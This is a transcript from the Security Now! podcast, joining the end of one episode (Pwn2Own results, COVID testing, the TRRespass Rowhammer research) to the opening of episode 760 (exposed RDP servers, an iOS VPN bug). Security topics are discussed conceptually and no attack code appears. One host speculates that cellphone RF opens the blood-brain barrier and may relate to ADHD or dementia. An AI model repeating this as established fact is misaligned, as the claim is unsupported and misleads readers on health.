The Fluoroacetate team came back one final time for the sixth exploit of the competition, targeting Adobe Reader with a Windows...



LEO:  They shouldn't get any points for that.  That should be just, oh, yeah, I know, okay.



STEVE:  Exactly what I thought.  What I thought, for sure, oh, come on.  Except it turns out it was a complex combination of Reader and obtaining a local privilege escalation.  They employed a pair of two use-after-free bugs, one in Acrobat and one in the Windows kernel, in order to hike their privileges and to gain control, complete control over the system.  That one got them $50,000 and five points toward the Master of Pwn.



Only one exploit failed during the competition, which was the seventh and final one.  It was made by the Synacktiv team.  They targeted VMware Workstation, obviously also in the Virtualization category.  But as I noted, the attempt failed when they were unable to get their exploit to function in the allotted time.  So overall, despite doing this virtually, we were still able to have an interesting and worthwhile and hopefully motivational Pwn2Own meeting.  These guys are taking home some serious bread, and it's definitely worth...



LEO:  I think they should stream this like eSports.  I mean, seriously, this is cool.



STEVE:  It would be, really, yeah.



LEO:  Yeah, yeah.



STEVE:  It seriously is.  So I had a couple of just sort of observations and discoveries relative to where we are today with the coronavirus that I wanted to share with our listeners.  I wanted to mention testing briefly because we've all been hearing about testing.  What has become clear to me as I've been reading a lot about this is that this PCR test, technically called an RT-PCR, Reverse Transcription Polymerase Chain Reaction, it had the benefit of being quick to design, but the serious liability of never really being scalable.



And frankly, after I've understood what's involved, I'm astonished that other countries are managing to perform this test.  As far as I know, this is what they're still using.  They're able to perform this test in the kind of volume they are.  It is extremely labor intensive.  It's very slow.  It takes at least four hours, and often more.  And it's expensive.  It ties up equipment during that time.  It tends to burn through the very scarce personal protective equipment because when you get this flexible synthetic - it can't be a cotton swab.  It has to be a synthetic swab because cotton interacts with the virus.



When you get this flexible synthetic swab shoved further up your nose than you knew your nose went, it's very uncomfortable.  People invariably cough or sneeze, thus polluting the local environment.  And that means that the person administering the test has to change and discard this round of personal protective equipment.  It's just never going to be a solution for mass testing.



And it's turning out that there was some interesting input back from China that suggested that they're seeing a significant level of false negatives, meaning it is not successfully detecting somebody with the problem.  The reason is that the actual virus is operating down in our lungs, and at the very top of our upper respiratory system there just may not be any.  The virus apparently takes up shop for three or four days up in our throat, which is why a sore throat is the very first symptom that most people report.  And it is often transient, and then the virus moves down into our lungs, where it of course causes famous all kinds of havoc.



Anyway, where we're headed, and we're there in terms of the design, but not yet in terms of availability, there's a broad class of tests known as ELISA tests that came online in 1971.  ELISA is an abbreviation for Enzyme-Linked ImmunoSorbent Assay.  And here's a description from one of the very many pieces of work that's currently underway.  The guys that have designed a test, just to give you a sense for it, said:  "To create the test, the researchers began by designing a slightly altered version of the 'spike' protein on SARS-CoV-2 outer coat."



They said:  "The alterations made the protein more stable for use in the lab.  That protein helps the virus enter cells, and it is a key target in the immune reaction against the virus, as the body churns out antibodies that recognize the protein and tag the virus for destruction."  So in other words, this is the thing that they want, that our body needs to learn to recognize, and that they want their test to be able to use.



They said:  "They also isolated the short piece of the spike chain protein called the receptor-binding protein (RBD), which the virus uses to attach to cells it tries to invade.  They then used cell lines to reproduce large quantities of the altered spike proteins and RBDs.  Those lab-made molecules provided the basis for an ELISA test, in which antibodies in a sample of blood or plasma trigger a color change when they recognize a target protein - here, an RBD or the spike protein.  Initial tests of four blood samples from three confirmed COVID-19 patients, and from 59 serum samples banked before the start of the outbreak, showed that the test worked, as antibodies to SARS-CoV-2 bound to the test's proteins.  It showed positive results only for the COVID-19 patients and not for any of those controls."



So that's a little bit of sort of behind-the-scenes of how these tests are developed, and the fact that we're in the process of moving past this existing PCR test with all of its many problems.  It's going to take a while for labs to ramp up, for the supply chain to get into place, and for these to get standardized.  The FDA has already approved one of these.



And as we know, one of the great things in my opinion that our administration has done is to really take the shackles off of the typical way overprotective FDA safeguards in order to get these things out into use as soon as, I mean, maybe mistakes will be made.  But what we really need is visibility.  And having a finger prick test that anyone can do in a few minutes will be incredibly useful.  It'll give us the first sense of visibility.



And the other thing I just sort of wanted to mention from a math standpoint is how I'm just infuriated every time I see the popular press say there are 30,000 cases of COVID-19 in the U.S.  No.  There are 30,000 people who were tested positive.  But as we know, globally, not just in the U.S., but a tiny fraction of people were tested.  And so we still have absolutely no sense for how widespread this is.  And this is no one's fault.  This PCR test, as I said, is a disaster, with multiple reagents.  It's extremely labor intensive to do.  It was never scalable on a scale that we need.



But while I've been thinking about this, I've realized that we are never going to test all, what is it, 330 million citizens in the U.S.?  Maybe we'll test a statistically significant sample, so that from a statistics standpoint we can know with some level of certainty that, okay, we found this percentage of positives in a heterogeneous sample cohort of a certain size.  So we know that with reasonable certainty it can't be more than this or fewer than that.  But still, we don't have 100% visibility.



What occurred to me, and it's a little bit morbid, but it's true, is one thing that we absolutely know is the death toll that this is taking.  That is, we know the other endpoint of some percentage of these sicknesses.  And so the only thing, because how many people "have it," quote unquote, is just complete nonsense.  It's not of any use.  What is of use is unfortunately the shape of the death curve.



The problem is it lags, as we know, at least on the order of two or three weeks behind the "who has it and could be tested to have it" curve.  So that means that, as we know, everything is moving very rapidly here.  So unfortunately, using the count of people who have died isn't useful for making real-time policy decisions which you'd like to be making three weeks earlier, but we just still don't have that data.



But for me, from an epidemiological standpoint, as long as the curve is going upwards, we don't know where it will end.  It is only when the slope starts to slow, or hopefully reverse, and that we stop seeing an increased rate of dying, that we'll know that three weeks earlier than that things were being done that were slowing down the spread.  So anyway, I just sort of wanted to - I've talked about this a few times in other forums, and I sort of thought it's interesting to remind ourselves that the one real number we have, sad as it is, is how many people this thing is taking out.  And nobody needs tests to determine that, sadly.



Also, last week I shared a GRC shortcut, grc.sc/covid, which was that Ars Technica backgrounder.  I have two more.  The first one is, oh, my god, it is so wonderful.  It is an animated presentation of sort of the whole situation.  It's an explainer for the whole family.  And it's so well done, so kind of with a little bit of a tongue in cheek, not taking itself very seriously.  I hope that our listeners will grab it and arrange to put it on a big screen for the whole family to watch.  And that's grc.sc/covid2.  It basically walks its viewer through this entire thing, like why exactly does hand-washing work.



LEO:  Yeah.  I loved the info about how the virus works that gives you the information about cleaning up.  This is from a - 16 million views on this, by the way.  It's from a channel called Kurzgesagt, which means, I guess, in a nutshell.



STEVE:  Mark Thompson knew about it, and he said, oh, yeah, I love the...



LEO:  Yeah, they do a lot of good science stuff.  And I'm guessing he's German because of the accent, but also because of the name.  But it's very well done, yeah.



STEVE:  Anyway, I cannot recommend it highly enough to our listeners.  You can find it, grc.sc/covid2.



LEO:  Yeah.



STEVE:  Okay, now, the third one is way higher level.  This is not for everybody.  Certainly not, well, so it is medical school-level whiteboard explanation of where the coronaviruses have been originating, the original source of the pathogen, its mutation over time.  It's a whiteboard presentation by a guy who I grew increasingly respectful for.



LEO:  Ninja nerd science.



STEVE:  Wow.  It is really good.



LEO:  He's got good whiteboard skills, I can tell.



STEVE:  Yes, he does.  And he's, like, rubbing mistakes out.  He's changing colors.  He prints clearly enough that you're able to see what's going on.  Anyway, so for our listeners who can weather, like, the real down-in-the-details medical science, I mean - and it's funny, too, because one of the guys in the grc.health newsgroup named Ian, after he watched it he posted, "Okay, I'm ready to move on to the anxiety counseling video now."



LEO:  Yeah.  Because it is scary, yeah. 



STEVE:  It's grim.



LEO:  Yeah.



STEVE:  It is grim.  But anyway, so grc.sc/covid2 for the family-friendly amazing animated - and this is the one you're going to want to share with everybody that you guys know.  And then covid3 for, like, okay, just sit down, and you'll be in medical school for about 50 minutes.  You'll come out the other end having a real sense for what's going on.



LEO:  I will watch that one tonight because I watched the other one, and I loved it.  And in fact we did exactly what you suggested, which is put it on the big screen and got everybody to sit down and watch it because it was a really good explainer, the In a Nutshell.



STEVE:  Oh, my god.  It's just amazing.



LEO:  Yeah.



STEVE:  Okay.



LEO:  Can I ask, before we get to the topic of the day...



STEVE:  Oh, yeah, yeah, yeah.



LEO:  A listener has called me now twice on the radio show to say what the hell size of the mug is that that Steve - no.  Steve and his giant mugs, of course, occasions interest among all.  But he says at one point on a show you mentioned why you don't want to use wireless headphones, like there might be some health risk associated with that.



STEVE:  Oh, gosh.  I have avoided talking about this.



LEO:  Okay.



STEVE:  We actually do have some science about this.



LEO:  Okay.



STEVE:  There is something in the structure of our brain known as the "blood brain barrier."



LEO:  Yes.



STEVE:  It sounds like some Wall of Jericho or something, but it's not.  It's the fancy name for a different form of endothelial lining and all the capillaries which feed nutrition to our brain.  So it's just a different interface lining for blood-borne stuff, allowing only some things to get through.  And for me, as someone who's like wanting to experiment with things, interesting chemicals like GABA are unable to pass the blood brain barrier.  So you have to use a precursor, tryptophan, which is able to pass, being a simpler amino acid, in order to get tryptophan in, and then you get an increased production of GABA inside.  And, you know, and so forth.



So what has been shown is that cellular frequency and power significantly increases the porosity, the porousness of our blood brain barrier.  Some researchers were able to place some chemicals outside which would normally never be seen inside, and then use nothing more than the equivalent power of a cell phone transmitting at your head and demonstrate uptake into the interior of our brain these chemicals.



LEO:  So in other words, it might make the blood brain barrier more porous.  It's funny because this is, you know, we talk about the damages from RF.  What I consistently say is, well, the problem with that of course is that RF is not the kind of radiation that would damage cell structure.  And it diminishes with distance by such a great deal, and it's such low power to begin with that it seems unlikely, and there's never been any evidence that cell-style radio transmissions or for that matter Bluetooth would cause damage to the cells.  It's not ionizing radiation.  But this is a completely different kind of damage.  And I doubt anybody's even looked at this except for this study that you're quoting.



STEVE:  It's why I believe it is science-based.  And I'll see if I can find the article.



LEO:  And this is not - this is something caused by the RF, not by, for instance, one of the things I've heard some people say is, well, if you're worried about cell phone radiation, and you use Bluetooth headset to protect yourself, or you don't want to use Bluetooth because of the radiation there, plugging in a wire just puts a direct line from the cell phone into your ear.  So it wouldn't necessarily be...



STEVE:  Yeah, it does serve as an antenna.



LEO:  Yeah.



STEVE:  Yeah.  You know, Lorrie very, very reliably holds the phone about a foot away.  It is the case that the power drop is dramatic.



LEO:  Yeah, it's the inverse of the square of the distance.



STEVE:  It's also the case that, when it's at your ear, you have a transmitter there that is reaching out to a cell tower.  So, and we know how quickly it drains the battery in our phone.  I mean, it's not a low bit of power.  We're all wanting the convenience of this not being a problem.  I just hope it won't be a problem.



LEO:  There's no evidence of increased brain cancer from cell phone use.  And we've had it now for more than a decade.  But this interesting - this porousness of the blood brain barrier is intriguing.  I don't know what the consequences would be.  It might be illnesses, not cancer illnesses, but other illnesses or other issues.



STEVE:  Well, and who knows; you know?  Alzheimer's or dementia or other things that seem to be on the rise that we're like, oh, look, why do we have more of this now?  Or ADHD that seems to be a plague.  You know, it's like we are - we're mucking with something that wasn't designed to happen.  So, yeah, fortunately I'm just not a phone talker.  I just there's - I never have occasion to do it.  And Lorrie's really good about using her speakerphone function.



LEO:  Yeah.



STEVE:  So that's the answer.  And I'll find the paper.



LEO:  Thank you.



STEVE: I imagine our listeners would - and I imagine now that I've opened the Pandora's Box to this...



LEO:  You're going to have to put a link in.



STEVE:  ...a lot of people are going to, "Hey, Gibson, blah blah blah."  It's like, okay, slow down.



LEO:  Yes.  Yeah, want to hear more about that.



STEVE:  All I'm doing is telling you what I read.  And it looked legit.



Okay.  TRRespass, T-R-R-e-s-p-a-s-s.  The short version is the fixes for Rowhammer have not worked.



LEO:  Oh.



STEVE:  Yeah.  We began covering Rowhammer half a podcast, half this podcast ago, six years, in 2014.  And remember, we should not confuse Rowhammer with the more theoretical processor architecture attacks such as Spectre and Meltdown.  They were important because they showed how the tricky designs used to increase processor performance could be leveraged against us.  But they were never easy to pull off in the field.  The researchers have shown over and over again, and I'm going to have a little - I found a bullet-point list of things they did.  They'd shown that Rowhammer is a much more real and significant threat.



So to quickly recap, researchers six years ago discovered that the main bulk volatile DRAM lying at the heart of every system we use was not nearly as robust anymore as we'd always assumed.  Over the years, under the pressure to deliver ever more RAM density, DRAM density, the memory storage cells had been successively reduced in size to the point where they were operating right on the hairy edge of "We can't make them any smaller."  And think about it, Leo.  Remember the RAM we used to have that was like, a few megs or maybe a gig?  Now you're plugging in 64GB in the same size chunk.



So it's like, okay, what's the story?  And DRAM parity checking and error correction technologies, which were originally intended to protect against the stray cosmic ray hitting and flipping a bit, they're increasingly being used to buffer the DRAM's underlying reduced reliability.  We can think of this in terms of a noise margin where there's a given certainty that a DRAM cell's voltage represents a zero or a one.  And over time, in the pursuit of DRAM density, the noise margin has been successively reduced.



Well, the ever-clever ever-loving researchers, and this is Herbert Bos and his gang back at University of Amsterdam and some others, showed the world back then that by forcing atypical DRAM access patterns to deliberately create higher environmental noise, that is, like noise in the area, it was possible to cause modern DRAM to malfunction in such a way that with some control over this, individual bits could be flipped.



Since today's processors use DRAM-based tables to manage their memory virtualization, they then demonstrated, the researchers, all of the various sorts of mischief that could be created by flipping bits in these DRAM-based management tables and much more.  Malicious row hammering processes could give themselves full access to other processes, give themselves read-write access into the Windows OS or any OS kernel and more.



So through the ensuing years, and here's my bullet-list, researchers showed how a Rowhammer attack could alter data stored in DDR3 and DDR4 memory.  They showed how a Rowhammer attack could be carried out via JavaScript, via the web, and not requiring access to a PC physically or via local malware.  They demoed a Rowhammer attack that took over Windows computers through the Microsoft Edge browser.  They demoed a Rowhammer attack that took over Linux-based virtual machines installed in cloud hosting environments.  They used a Rowhammer attack to get root permissions on Android smartphones.



They bypassed Rowhammer protections put in place after the disclosure of the first attacks.  They showed how an attacker could improve the efficiency of a Rowhammer attack by relying on local GPU cards.  They developed a technique to launch Rowhammer attacks via network packets.  They developed a Rowhammer attack that targets an Android memory subsystem called ION, and which broke the isolation between the OS and local apps, allowing data theft and total device control.



They developed a Rowhammer attack named ECCploit that works even against modern RAM cards that use error-correcting code.  They discovered RAMBleed, a Rowhammer attack variation that can exfiltrate data from attacked systems, not just alter it.  And they developed a technique to speed up Rowhammer attacks with the help of field-programmable gate array cards in an attack named Jackhammer.  So these guys have been busy.



The solution to all of this Rowhammer mess was supposed to be a series of mitigations collectively referred to as Target Row Refresh (TRR).  And thus the T-R-R-e-s-p-a-s-s,  TRRespass, Target Row Refresh.  And we've talked about that, too, the idea being that noise immunity can be maintained if DRAM rows in the areas of unusually high activity, which we've learned would tend to soften their stored bits, are proactively brought up for refresh more often, thus reasserting their zero-ness and one-ness.  TRR has been gradually implemented and has been rolling out over the past six years.



And back then we were talking about, oh, DDR4, that'll be the answer because that's coming online, and that's going to be the solution.  They were the first ones to receive the TRR, the Target Row Refresh protections.  And for a while vendors believed that they had finally plugged the Rowhammer issue.  But you always have to worry when you hear the term "mitigation," as in, well, we really didn't fix it, but we made it much better.  Uh-huh.  The original Rowhammer guys, led by Herbert Bos and his team from Amsterdam University, in league with researchers from ETH Zurich and Qualcomm, recently released their paper titled:  "TRRespass" - spelled their funny way - "Exploiting the Many Sides of Target Row Refresh."  I think I'm about to sneeze.  Maybe not.  I love sneezing.



LEO:  Oh, it's so good.



STEVE:  Nose tickle.  In this research - I think it passed - they outlined their development of a generic tool called TRRespass that can be used to upgrade the old Rowhammer attacks to work on the new and improved TRR-protected DDR4 RAM.



So here's how they summarized their work.  They have three paragraphs:  "After a plethora of high-profile Rowhammer attacks, CPU and DRAM manufacturers scrambled to deliver what was meant to be the definitive hardware solution against the Rowhammer problem:  Target Row Refresh.  A common belief among practitioners is that, on the latest generation of DDR4 systems that are protected by TRR, Rowhammer is no longer an issue in practice.  However, in reality, very little is known about TRR.  How does it work?  How is it deployed?  And is it actually effective against Rowhammer?"  We want to know.



"In this paper, we demystify the inner workings of TRR and debunk its security guarantees.  We show that what is advertised as a single mitigation is actually a series of different solutions coalesced under the umbrella term "Target Row Refresh."  We inspect and disclose, via a deep analysis, different existing TRR solutions, and demonstrate that modern implementations operate entirely inside DRAM chips."



What they meant by that was that it wasn't clear whether some of this might be done by the DRAM controller, which is upstream of the chips.  What they learned was DRAM controllers are still asleep.  They didn't bother with this at all.  All the responsibility was given to the DRAM chips themselves.



They said:  "Despite the difficulties of analyzing in-DRAM mitigations, we describe novel techniques for gaining insights into the operation of these mitigations.  These insights allow us to build TRRespass, a scalable black box Rowhammer fuzzer that we evaluate on 42 recent DDR4 DIMMs.  TRRespass shows that even the latest generation DDR4 systems with in-DRAM TRR, immune to all known Rowhammer attacks, are often still vulnerable to new TRR-aware variants of Rowhammer that we have developed.  In particular, TRRespass finds that, on present-day DDR4 modules, Rowhammer is still possible when many aggressor rows are used," they said, "even 19 in some cases."  It actually turns out four is enough.  Aggressor rows being the neighborly adjoining rows which are used to induce bit flips.



They said:  "...in a configuration we generally refer to as 'many-sided Rowhammer.'  Overall, our analysis shows that 13 out of the 42 DIMMs from all three major DRAM manufacturers - Samsung, Micron and Hynix - are vulnerable to our TRR-aware Rowhammer attack patterns, and thus one can still mount existing state-of-the-art Rowhammer attacks.  In addition to DDR4, we also experiment with LPDDR4 chips and show that they are susceptible to Rowhammer bit flips, too.  Our results provide concrete evidence that the pursuit of better mitigations must continue."



So what has essentially happened is that DRAM manufacturers looked at the existing Rowhammer attacks.  They didn't actually solve the Rowhammer problem because, frankly, they can't.  The Rowhammer problem does not arise from some defect in DRAM.  It is insidious because it arises from the underlying technology of DRAM for which there can be no quick fix.



So what did they do?  They designed, the manufacturers, the DRAM manufacturers designed internal secret proprietary hardware-mitigation workarounds for the various specific known Rowhammer attacks.  So the various things that were done before, indeed, no longer work.  The undaunted researchers reverse engineered what was going on inside the DRAM controllers by very carefully examining the updated DRAM.  They used a side-channel analysis of DRAM in order to figure out what the algorithms were in the DRAM controllers.  And once they'd learned the tricks that had been incorporated, they simply evolved different attacks to bypass those new tricks.



They had three observations in their notes.  They said the TRR mitigation carries out a targeted refresh on every refresh command.  Second observation, the mitigation can sample more than one aggressor per refresh interval.  The third observation, the mitigation can refresh only a single victim within a refresh operation.



So in other words, those are examples of the things they learned about what was being done in DRAM controllers.  And they came up with:  "Based on these observations, we conclude that hammering more than four rows should circumvent the mitigation.  We confirm this by running a test on our FPGA infrastructure with standard conditions."  And I'm not going to go through their conclusions because they're largely repetitious.



But I did highlight in red here:  "Our results provide evidence that the pursuit of effective Rowhammer mitigation must continue and that the security by obscurity strategy of DRAM vendors puts computing systems at risk for extended periods of time."  And I missed the thing that I thought I'd highlighted there.  I know what it was.  Oh, here it is.



"This paper shows that, despite significant mitigation efforts, modern DDR4 systems are still vulnerable to the Rowhammer vulnerability, and even more vulnerable than before, once the mitigations are bypassed."  So essentially the DDR4 memory that again bumped up its capacity and increased the fundamental problem implemented some heuristic design tricks to solve, they thought, the increased fundamental problem resulting from reduced noise margins in DDR4 higher speed, higher density chips.



So they tried to work around that by making a fancy controller.  But it turns out that's algorithmic.  You can figure out the algorithms, and you can sidestep them.  So, you know, tip of the hat to the researchers who did this.  Without this, we would all just say, oh, look, Rowhammer no longer works.  Yeah.  It's worse than it was before because now we have DDR4, and the protection algorithms can be bypassed.



LEO:  Wow.  What a story.  Steve, thank you.  As always, Steve Gibson, ladies and gentlemen.  Let's hear it for Steve.  Round of applause for Steve Gibson, man of the hour.  Security Now! is every Tuesday, 1:30 Pacific, 4:30 Eastern, if you want to watch us do it live.  That's 20:30 UTC.  You can just watch the live stream at TWiT.tv/live.  You can listen to live audio, too.



I think more and more, you know, because of COVID-19, conferences and events are disappearing.  People are not getting together in person.  But a show like this is a great opportunity to get the information you need without having to leave your house.  So we really appreciate it.  In fact, if you subscribe, you'll get every episode.  You don't want to miss an episode.  Just go to your favorite podcast client and subscribe.



Steve has 16Kb versions, for people who don't want to use the bandwidth, on his website, GRC.com.  He also has transcriptions written by humans, not by machines.  So Elaine does a great job writing those out, and they make it a little easier if you want to follow along as you listen.  That's all at GRC.com.  While you're there, get a copy of SpinRite, the world's best hard drive maintenance and recovery utility.  Steve's scribbling right now, writing like crazy to make the next version of SpinRite.  You'll get it for free, you'll even be able to beta test it, if you buy SpinRite right now:  GRC.com.  Lots of other stuff at GRC.com, including...



STEVE:  Actually, this morning I posted a "Thanks for your patience" note to the grc.spinrite.dev group, who have been patiently waiting for me to return.  I was down for the week...



LEO:  You were sick.



STEVE:  ...between these podcasts, yeah.  I was...



LEO:  I'm really glad you rested and took it easy.  And I want to agree with Lorrie, don't do it if it's going to take it out of you.



STEVE:  Well, I really thank the global pandemic for fitting nicely in between Security Now! episodes because I was able to emerge for a little burst of podcast last week, and then I was pretty much laid flat for a few days. 



LEO:  You need to take it easy, Steve.  We can't afford to lose you.



STEVE:  I love my body.  It always performs for me.



LEO:  Lisa wanted me to tell you that you've got to take care of yourself because in this COVID day and age we get more and more advertisers who want to be on Security Now! because they know this is how you reach that audience.  When you can't have a conference or you can't get in front of them any other way, advertising with Security Now! is the best way to do it.  And they always mention you and how much they love you.



So thank you, Steve.  We really appreciate it.  You may be the last man standing as the TWiT Network slowly dwindles down to nothing.  But this show, this show will go on.  We have, as I mentioned, at TWiT.tv/sn we've got audio and video of the show.  But again, the best thing to do is subscribe in your favorite podcast application so you don't miss a minute.  And we will be back here next Tuesday.  Steve will be fit as a fiddle, and we'll have a lot more information for you.  Thanks, Steve.



STEVE:  Yes, sir, my friend.  Glad to be here.  Glad to do it.  And I'll see you next week.  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#760

DATE:		March 31, 2020

TITLE:		Folding Proteins

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-760.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we examine some consequences of increased telecommuting with the use of RDP and VPNs skyrocketing, along with a new bug in iOS's handling of VPN connections.  We look at Google's unrelenting quest to get the "www" out, and note some changes to Firefox and further revisions of browser release schedules.  We take a deep dive into a very welcome forthcoming code security feature for Windows 10.  We share an action item for users of OpenWRT routers, and the result of an audit of Cloudflare's privacy-enforcing DNS service.  We divulge a few interesting bits of feedback and some SQRL and SpinRite miscellany, then finish by examining a new opportunity to donate our unused CPU cycles for help with COVID-19 research.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We've got RDP.  We've got VPNs.  We'll talk a little bit about something Intel's calling "Shadow Stack" and why you will want this on every x86 architecture.  And, finally, Folding@home, how you can help conquer COVID with your spare cycles.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 760, recorded Tuesday, March 31st, 2020:  Folding Proteins.



It's time for Security Now!, the show where we cover security, privacy, and how things work.



STEVE GIBSON:  Eventually.



LEO:  Eventually, in obsessive detail.  We're only half an hour late, Steve.  This is a new world record.



STEVE:  Well, yes.



LEO:  Welcome, Steve Gibson, host of our show.



STEVE:  Great to be here, Leo, with you for Episode 760 for the last day, this is a Tuesday, the last day of March, which means that April's Patch Tuesday, as I've noted before, will be as late in the month as it's possible to have it, as happens from time to time.  We've got a bunch to talk about, bunch of fun stuff, sort of a potpourri.



We're going to look at some consequences of increased telecommuting with the expanded use of RDP and VPNs skyrocketing.  We've got a new bug, I heard you mention it in MacBreak, in iOS's handling of VPN connections, which is not a huge problem, as you said then.  I'm sure Apple will fix it.  But it's kind of interesting.  We also look at Google's unrelenting quest to get the www out of URLs, against also unrelenting pressure against doing that, apparently.  We have some changes to Firefox, and further revisions of browser release schedules as our major browser producers work to figure out this new world that we're living in.



We're going to take a deep dive into a very welcome forthcoming code security feature for Windows 10.  We're going to share an action item for users who have put the OpenWRT firmware onto their routers.  Also the result of an independent audit of Cloudflare's privacy-enforcing DNS service.  Then I want to update our listeners on a few interesting bits of feedback regarding SQRL and SpinRite.  And then we're going to finish by examining a new opportunity, since SETI@home has shut down, to donate our unused CPU cycles for help with COVID-19 research, thus the title of this podcast, "Folding Proteins."



LEO:  Ooh.  I'm curious about this because I'm a little skeptical.  You know, we did SETI@home for 20 years.  And I'm a little skeptical.



STEVE:  Well, maybe it's a little different to be searching for space aliens from the background cosmic radiation, different from proven technology to understand the molecular modeling of amino acids.



LEO:  And Folding@home has some success stories to tell.



STEVE:  Yes.



LEO:  That's the key; right?  They've actually used these, what is it, multi teraflop, multi petaflop...



STEVE:  We're now at exaflop, believe it or not.



LEO:  Exaflops, wow.



STEVE:  The current Folding@home base of computers has a power equal to the sum of the world's seven largest supercomputers combined.  It is a stunning resource.  And in fact that's part of the problem is it's got too much power.  They're like apologizing for the fact that people's computers aren't busy all the time.  It's like, we're working as hard as we can to keep them busy.  So anyway, we'll talk about that at the end of the podcast.



LEO:  Nice.



STEVE:  So we have our typical geeky Picture of the Week, which due to the situation the world is in right now takes another look at coronavirus.  We've got someone talking to a doctor, or somebody who has a mask on and a Red Cross hat.  So this first person says, "Well, coronavirus is just simple DDoS," which first of all I thought was kind of clever, a distributed denial of service, as indeed we're all living through right now.  The doctor replies, "Yes, so close your ports and stay 127.0.0.1."  So another fun take on the techie side of this.



And speaking of VPNs, that was the first bit of news that I wanted to share today.  Not surprisingly, although in the case of RDP somewhat worryingly, both RDP and VPN use are skyrocketing since the beginning of the year, you know, to no one's surprise.  The use of the cloud and all remote access technologies has jumped up significantly since this whole stay-at-home went into effect in many parts of the U.S. and also increasingly globally.  We have some numbers for that.



Microsoft's perpetually security-challenged Remote Desktop Protocol usage, based on the presence of available ports - that is, 3389, publicly present on the Internet - has jumped 41%.  And popular VPN port appearances have gone up by a third, 33%.  And this is according to data compiled by Shodan, the online public scanning service that we're now talking about all the time these days.  The number of publicly visible RDP endpoints - which is to say servers answering TCP connections at port, in this case, 3389 - has gone from roughly three million at the start of the year to nearly 4.4 million the day before yesterday, just this most recent Sunday, March 29th.  And this only reflects RDP servers listening on the default RDP port 3389.



John Matherly, who's Shodan's CEO and founder, noted in an interview with ZDNet that a similar surge has also been seen - I got a kick out of this - on port 3388, which of course is 3389 minus one, which he says is regularly used by system admins to, quote, "hide," unquote, the RDP service from attackers.  Okay.  Now, of course all the attackers know that now.  So for that not-very-well-hidden port, the number has also jumped, in this case by 36.8% from roughly 60,000 3388 instances of RDP listening on that port to 80,000, from 60,000 to 80,000 currently.



And I know I'm a broken record about this, but seeing a jump in exposed RDP ports is horrifying since all of our experience informs us that Microsoft has never managed to make RDP safe to expose publicly.  It should always be safely tucked behind a strong VPN, yet another reason to use a VPN.  And then the VPN should itself use some form of multifactor authentication, as all good strong enterprise VPNs do.  You don't want it to just be username and password unless you've got some very strong protection against someone just doing, as it's now called, a credential stuffing attack where usernames and passwords are guessed until they get in.



And speaking of VPNs, Shodan has seen the number of servers running VPN protocols, the traditional enterprise protocols like IKE and PPTP, jump up by a third from about 7.5 million systems to nearly 10 million now.  IKE and PPTP are typically what enterprises use as gateways into their Intranet and their internal corporate networks.



And apropos of the sponsor of this podcast, the use of consumer-grade VPNs has also seen a sudden surge in usage.  And of course, exactly as Leo was suggesting, in this case it's most likely for use in bypassing so-called "geofencing" for online content while people are stuck at home.  There's been a 165% rise in users since just before the middle of March in several cases.  There's a site called Top10VPN that sort of is a third-party VPN service rater.



And they wrote of Netflix-compatible VPNs, they said:  "To bypass Netflix's location restrictions and unblock all the 'hidden' TV series and movies," they said, "you need to know what's the best VPN for Netflix."  And they said:  "Unfortunately, not all VPNs work with Netflix.  But don't worry, we're here to help.  Our team of experts regularly tests 72 VPNs to see if they unblock Netflix libraries in the U.S., the U.K., and many other countries."



And, you know, they go on to talk about this.  And in their monitoring of VPN usage, they've seen a recent 65% overall increase in consumer use of VPNs.  So I think in general, because VPNs in general do a better job of security, I would always recommend to our users that they use multifactor authentication if possible.  On the other hand, a consumer use of a VPN is going to be on the client side.  So that's a different concern than this jump in listening RDP servers.  There we're talking about a big jump in exposed RDP usage.



And, you know, I shudder to think where all of these RDP servers came from.  You know, it doesn't feel like, I mean, maybe enterprise has responded that quickly.  I worry, though, that people have put their home machines or maybe their work machines now have some sort of an RDP presence on the Internet because people want to be able to get to them remotely.  And so credential stuffing attacks have been shown to be surprisingly effective.  So it would be so much better to hide everything behind a VPN and then need to log into the VPN in order to get access to an RDP server behind it.  I have a feeling we'll be doing some coverage of updated RDP attacks here before long.



And speaking of VPN handling, we got an interesting feature update to iOS.  And Leo, I meant to mention to you, Paul Thurrott's rave about iOS with a mouse, iOS devices with a mouse last week, I caught the tail end of it on Windows Weekly, and I just was amazed by that.  And in fact his raving about it induced me to hook up a Bluetooth mouse to an iPad, and I have to say he's not wrong.  It's an interesting usability solution.  So I thought that was just very cool.



But anyway, one of the things that happened, actually it was first occurring in v13.3.1, and it's extended into 13.4, is it has come to the community's attention, actually it was ProtonVPN who were just sort of doing some packet-sniffing work and noticed something weird going on.  A ProtonVPN researcher was using Wireshark to monitor the packet traffic from an iOS device when he noticed that, even after the VPN was brought up and its tunnel was active, non-tunneled traffic from before the VPN was enabled continued to be exchanged with the iOS device.  iOS was not closing its existing connections and then reconnecting them once the VPN was in place as one would have expected it to.  So as a consequence, any connections that were initiated after the VPN was active would be securely routed through the VPN.  But any preexisting connections would not be protected unless the individual services close or reset the connections themselves.



From a practical standpoint, we know that nearly everything these days is HTTPS, so it's not like any important data would be in the clear.  That would be unlikely.  But of course that's often not the point since users have an expectation that their IP address would be protected while using a VPN.  And in this case it would not be.  On the other hand, their IP wasn't being protected before they turned the VPN on.  So, you know, it's not a huge big deal.



The ProtonVPN folks found a simple sort of brute force workaround, although it's a bit annoying because you have to do it by hand.  After you bring the VPN up so that it's online, then briefly switch the device to airplane mode or flight mode, which of course turns off the WiFi completely.  Then restore the device so that WiFi is enabled.  Turn off airplane or flight mode.  WiFi will come up.  All of the connections will reestablish themselves and be tunneled through the VPN.  Apple's suggestion about this is to configure "always on" VPN via their Mobile Device Management, MDM.  But it takes some work with putting the device into supervise mode, then using the Apple configurator.



